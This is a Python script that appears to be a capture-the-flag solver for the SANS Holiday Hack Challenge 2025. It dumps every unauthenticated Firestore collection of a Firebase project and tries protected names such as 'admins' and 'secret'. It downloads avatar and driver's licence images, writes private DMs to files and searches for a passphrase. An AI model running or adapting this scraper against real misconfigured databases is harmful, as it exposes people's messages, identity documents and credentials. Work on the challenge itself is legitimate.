#!/usr/bin/env python3
"""
GnomeTea Complete Data Extractor
SANS Holiday Hack Challenge 2025 - Act 3

This script extracts ALL data from the GnomeTea Firebase database:
- All Firestore collections (gnomes, tea, dms, admins, etc.)
- All images (avatars, driver's licenses)
- Parses and formats the data for easy analysis
"""

import requests
import json
import os
import re
from urllib.parse import urlparse
from pathlib import Path

# Configuration
PROJECT_ID = "holidayhack2025"
FIRESTORE_BASE = f"https://firestore.googleapis.com/v1/projects/{PROJECT_ID}/databases/(default)/documents"

# Collections to try (including the protected 'admins' collection)
COLLECTIONS = [
    "gnomes",
    "tea", 
    "dms",
    "admins",           # Contains secret_operations with passphrase!
    "secret",
    "config",
    "agent",
    "protocol",
    "classified",
    "operations",
    "settings"
]

# Image URL regex
IMAGE_REGEX = re.compile(
    r'(https?://[^\s\'"]+\.(?:png|jpg|jpeg|gif|webp|bmp|svg))',
    re.IGNORECASE
)

class FirestoreExtractor:
    def __init__(self, output_dir="gnometea_data"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
        self.json_dir = self.output_dir / "json"
        self.json_dir.mkdir(exist_ok=True)
        
        self.images_dir = self.output_dir / "images"
        self.images_dir.mkdir(exist_ok=True)
        
        self.parsed_dir = self.output_dir / "parsed"
        self.parsed_dir.mkdir(exist_ok=True)
        
        self.image_urls = set()
        
    def fetch_collection(self, collection_name):
        """Fetch all documents from a Firestore collection with pagination."""
        url = f"{FIRESTORE_BASE}/{collection_name}"
        all_docs = []
        
        print(f"\n[*] Fetching collection: {collection_name}")
        
        while True:
            try:
                response = requests.get(url, timeout=30)
                
                if response.status_code == 404:
                    print(f"[!] Collection '{collection_name}' not found")
                    return None
                
                if response.status_code == 403:
                    print(f"[!] Collection '{collection_name}' requires authentication (PROTECTED)")
                    return None
                    
                if response.status_code != 200:
                    print(f"[!] Error {response.status_code}: {response.text}")
                    return None
                
                data = response.json()
                docs = data.get("documents", [])
                all_docs.extend(docs)
                
                # Check for pagination
                next_page_token = data.get("nextPageToken")
                if not next_page_token:
                    break
                
                url = f"{FIRESTORE_BASE}/{collection_name}?pageToken={next_page_token}"
            
            except Exception as e:
                print(f"[!] Error fetching {collection_name}: {e}")
                return None
        
        print(f"[+] Found {len(all_docs)} documents in '{collection_name}'")
        return all_docs
    
    def save_raw_json(self, collection_name, docs):
        """Save raw Firestore documents to JSON."""
        if not docs:
            return
        
        filepath = self.json_dir / f"{collection_name}.json"
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(docs, f, indent=2)
        print(f"[+] Saved raw JSON: {filepath}")
    
    def extract_field_value(self, field_data):
        """Extract the actual value from Firestore field format."""
        if isinstance(field_data, dict):
            if "stringValue" in field_data:
                return field_data["stringValue"]
            elif "integerValue" in field_data:
                return int(field_data["integerValue"])
            elif "booleanValue" in field_data:
                return field_data["booleanValue"]
            elif "arrayValue" in field_data:
                values = field_data["arrayValue"].get("values", [])
                return [self.extract_field_value(v) for v in values]
            elif "mapValue" in field_data:
                return self.extract_map_value(field_data["mapValue"])
            elif "timestampValue" in field_data:
                return field_data["timestampValue"]
        return field_data
    
    def extract_map_value(self, map_data):
        """Extract all fields from a Firestore map."""
        fields = map_data.get("fields", {})
        result = {}
        for key, value in fields.items():
            result[key] = self.extract_field_value(value)
        return result
    
    def parse_document(self, doc):
        """Parse a Firestore document into a clean Python dict."""
        doc_id = doc.get("name", "").split("/")[-1]
        fields = doc.get("fields", {})
        
        parsed = {"_id": doc_id}
        for field_name, field_value in fields.items():
            parsed[field_name] = self.extract_field_value(field_value)
        
        return parsed
    
    def save_parsed_data(self, collection_name, docs):
        """Save parsed, human-readable data."""
        if not docs:
            return
        
        parsed_docs = [self.parse_document(doc) for doc in docs]
        
        filepath = self.parsed_dir / f"{collection_name}_parsed.json"
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(parsed_docs, f, indent=2)
        print(f"[+] Saved parsed JSON: {filepath}")
        
        return parsed_docs
    
    def extract_images_from_data(self, data):
        """Recursively extract image URLs from any data structure."""
        if isinstance(data, dict):
            for v in data.values():
                self.extract_images_from_data(v)
        elif isinstance(data, list):
            for item in data:
                self.extract_images_from_data(item)
        elif isinstance(data, str):
            matches = IMAGE_REGEX.findall(data)
            for url in matches:
                self.image_urls.add(url)
    
    def download_images(self):
        """Download all discovered images."""
        if not self.image_urls:
            print("\n[!] No images found to download")
            return
        
        print(f"\n[*] Downloading {len(self.image_urls)} images...")
        downloaded = 0
        failed = 0
        
        for url in self.image_urls:
            try:
                # Get filename from URL
                parsed = urlparse(url)
                filename = os.path.basename(parsed.path)
                if not filename:
                    filename = f"unnamed_{hash(url)}.png"
                
                filepath = self.images_dir / filename
                
                # Skip if already exists
                if filepath.exists():
                    print(f"[*] Already exists: {filename}")
                    continue
                
                # Download
                response = requests.get(url, timeout=30)
                if response.status_code == 200:
                    with open(filepath, "wb") as f:
                        f.write(response.content)
                    print(f"[+] Downloaded: {filename}")
                    downloaded += 1
                else:
                    print(f"[-] Failed ({response.status_code}): {url}")
                    failed += 1
                    
            except Exception as e:
                print(f"[-] Error downloading {url}: {e}")
                failed += 1
        
        print(f"\n[+] Downloaded: {downloaded} | Failed: {failed} | Total: {len(self.image_urls)}")
    
    def search_for_passphrase(self, all_parsed_data):
        """Search all data for the passphrase."""
        print("\n" + "="*80)
        print("SEARCHING FOR PASSPHRASE")
        print("="*80)
        
        for collection_name, docs in all_parsed_data.items():
            if not docs:
                continue
            
            for doc in docs:
                # Check if this document has a passphrase field
                if "passphrase" in doc:
                    print(f"\n🎯 PASSPHRASE FOUND! 🎯")
                    print(f"Collection: {collection_name}")
                    print(f"Document ID: {doc['_id']}")
                    if 'name' in doc:
                        print(f"Name: {doc['name']}")
                    print(f"\n{'='*80}")
                    print(f"SECRET PASSPHRASE: {doc['passphrase']}")
                    print(f"{'='*80}\n")
                    
                    # Save to file
                    with open(self.output_dir / "PASSPHRASE.txt", "w") as f:
                        f.write(f"SECRET PASSPHRASE: {doc['passphrase']}\n")
                        f.write(f"Collection: {collection_name}\n")
                        f.write(f"Document ID: {doc['_id']}\n")
                    
                    return doc['passphrase']
        
        print("[!] No passphrase found in accessible collections")
        return None
    
    def create_dm_conversations(self, dms_data):
        """Extract DM conversations into separate text files."""
        if not dms_data:
            return
        
        dms_dir = self.output_dir / "dm_conversations"
        dms_dir.mkdir(exist_ok=True)
        
        print(f"\n[*] Extracting {len(dms_data)} DM conversations...")
        
        for dm in dms_data:
            participant_names = dm.get("participantNames", [])
            messages = dm.get("messages", [])
            
            if len(participant_names) != 2:
                continue
            
            # Create filename
            p1, p2 = participant_names
            safe_p1 = re.sub(r'[^A-Za-z0-9\-_]', '', p1.replace(" ", "-"))
            safe_p2 = re.sub(r'[^A-Za-z0-9\-_]', '', p2.replace(" ", "-"))
            filename = f"{safe_p1}_and_{safe_p2}.txt"
            filepath = dms_dir / filename
            
            # Format messages
            lines = []
            for msg in messages:
                sender = msg.get("senderName", "Unknown")
                content = msg.get("content", "")
                lines.append(f"{sender}: {content}")
            
            # Write file
            with open(filepath, "w", encoding="utf-8") as f:
                f.write("\n".join(lines))
        
        print(f"[+] Saved {len(dms_data)} conversations to {dms_dir}")
    
    def create_summary_report(self, all_parsed_data):
        """Create a summary report of all extracted data."""
        report_path = self.output_dir / "EXTRACTION_REPORT.txt"
        
        with open(report_path, "w", encoding="utf-8") as f:
            f.write("="*80 + "\n")
            f.write("GNOMETEA DATA EXTRACTION REPORT\n")
            f.write("SANS Holiday Hack Challenge 2025 - Act 3\n")
            f.write("="*80 + "\n\n")
            
            f.write("COLLECTIONS EXTRACTED:\n")
            f.write("-"*80 + "\n")
            for collection_name, docs in all_parsed_data.items():
                if docs:
                    f.write(f"  • {collection_name}: {len(docs)} documents\n")
            
            f.write(f"\nIMAGES DISCOVERED: {len(self.image_urls)}\n")
            f.write(f"\nOUTPUT DIRECTORY: {self.output_dir.absolute()}\n\n")
            
            # List gnomes
            if "gnomes" in all_parsed_data and all_parsed_data["gnomes"]:
                f.write("\nGNOME ACCOUNTS:\n")
                f.write("-"*80 + "\n")
                for gnome in all_parsed_data["gnomes"]:
                    f.write(f"  • {gnome.get('name', 'Unknown')}: {gnome.get('email', 'no email')}\n")
            
            f.write("\n" + "="*80 + "\n")
        
        print(f"\n[+] Summary report saved: {report_path}")
    
    def run(self):
        """Run the complete extraction process."""
        print("="*80)
        print("GNOMETEA COMPLETE DATA EXTRACTOR")
        print("SANS Holiday Hack Challenge 2025 - Act 3")
        print("="*80)
        
        all_parsed_data = {}
        
        # Fetch all collections
        for collection_name in COLLECTIONS:
            docs = self.fetch_collection(collection_name)
            
            if docs:
                # Save raw JSON
                self.save_raw_json(collection_name, docs)
                
                # Parse and save human-readable version
                parsed = self.save_parsed_data(collection_name, docs)
                all_parsed_data[collection_name] = parsed
                
                # Extract image URLs
                self.extract_images_from_data(parsed)
        
        # Download images
        self.download_images()
        
        # Create DM conversation files
        if "dms" in all_parsed_data:
            self.create_dm_conversations(all_parsed_data["dms"])
        
        # Search for passphrase
        self.search_for_passphrase(all_parsed_data)
        
        # Create summary report
        self.create_summary_report(all_parsed_data)
        
        print("\n" + "="*80)
        print("✅ EXTRACTION COMPLETE!")
        print(f"📁 All data saved to: {self.output_dir.absolute()}")
        print("="*80)
        print("\nNEXT STEPS:")
        print("1. Check dm_conversations/ for Barnaby's password hint")
        print("2. Check images/ for Barnaby's driver's license")
        print("3. Look for PASSPHRASE.txt if the admins collection was accessible")
        print("="*80 + "\n")


def main():
    extractor = FirestoreExtractor()
    extractor.run()


if __name__ == "__main__":
    main()
